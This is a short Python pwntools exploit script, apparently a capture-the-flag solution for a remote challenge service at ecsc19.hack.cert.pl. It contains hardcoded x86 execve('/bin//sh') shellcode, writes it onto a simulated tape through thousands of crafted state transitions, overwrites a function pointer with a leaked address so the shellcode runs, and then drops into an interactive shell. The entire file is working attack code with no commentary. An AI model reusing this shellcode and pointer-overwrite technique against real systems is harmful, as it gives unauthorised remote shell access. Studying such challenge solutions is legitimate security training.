from pwn import *
import binascii

shellcode = bytearray("\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80")

# p = process("./main")
p = remote('ecsc19.hack.cert.pl', 25012)
address = p.recvline().split()[-1][2:]

def fill_tape():
	for i in range(10000):
		move = {}
		move['from_tape'] = 0
		move['from_state'] = i
		if i < len(shellcode):
			move['to_tape'] = shellcode[i]
		else:
			move['to_tape'] = 0
		move['to_state'] = i + 1
		move['direction'] = 1
		moves.append(move)

def jmp_to_func_ptr():
	for i in range(10000, 10016):
		for j in range(0, 256):
			move = {}
			move['from_tape'] = j
			move['from_state'] = i
			move['to_tape'] = j
			move['to_state'] = i + 1
			move['direction'] = 1
			moves.append(move)

def modify_func_ptr_to_exec_shellcode():
	for i in range(10016, 10020):
		for j in range(0, 256):
			move = {}
			move['from_tape'] = j
			move['from_state'] = i
			move['to_tape'] = ord(binascii.unhexlify(address)[3 - (i - 10016)])
			move['to_state'] = i + 1
			move['direction'] = 1
			moves.append(move)


moves = []

get_shell_move = {}
get_shell_move['from_tape'] = 0
get_shell_move['from_state'] = 10020
get_shell_move['to_tape'] = 0
get_shell_move['to_state'] = 10021
get_shell_move['direction'] = 1
moves.append(get_shell_move)

fill_tape()
jmp_to_func_ptr()
modify_func_ptr_to_exec_shellcode()

print p.recvline()

p.sendline(str(len(moves))+' 10000 1256789')

i = 0
for move in moves:
	p.send(' '.join(map(str, [move['from_tape'], move['from_state'], move['to_tape'], move['to_state'], move['direction']])) + '\n')
p.send(' '.join(['0'] * 10000) + '\n')
print p.recv()
p.interactive()

